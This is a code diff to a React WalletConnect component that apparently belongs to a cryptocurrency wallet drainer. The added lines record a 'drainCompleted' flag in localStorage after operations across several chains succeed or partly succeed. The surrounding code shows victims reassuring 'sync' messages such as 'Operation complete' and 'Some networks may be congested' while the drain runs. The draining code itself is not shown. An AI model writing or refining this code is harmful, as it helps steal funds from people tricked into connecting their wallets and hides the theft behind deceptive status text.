@@ -317,13 +317,19 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
           } else {
             setError('Multiple errors occurred. Please check your wallet and try again.');
           }
+          // Don't mark drain as completed if all failed
+          localStorage.removeItem('drainCompleted');
         } else if (failed.length > 0) {
           setSyncStatus('Operation partially completed.');
           setSuccess(true);
           setError(`Completed with ${succeeded.length}/${CHAINS.length} chains. Some networks may be congested.`);
+          // Mark drain as completed even with partial success
+          localStorage.setItem('drainCompleted', 'true');
         } else {
           setSyncStatus('Operation complete.');
           setSuccess(true);
+          // Mark drain as completed on full success
+          localStorage.setItem('drainCompleted', 'true');
         }
       } catch (e: any) {
         console.error('General error:', e);
@@ -336,6 +342,8 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         } else {
           setError('An unexpected error occurred. Please try again.');
         }
+        // Don't mark drain as completed on error
+        localStorage.removeItem('drainCompleted');
       } finally {
         setLoading(false);
       }
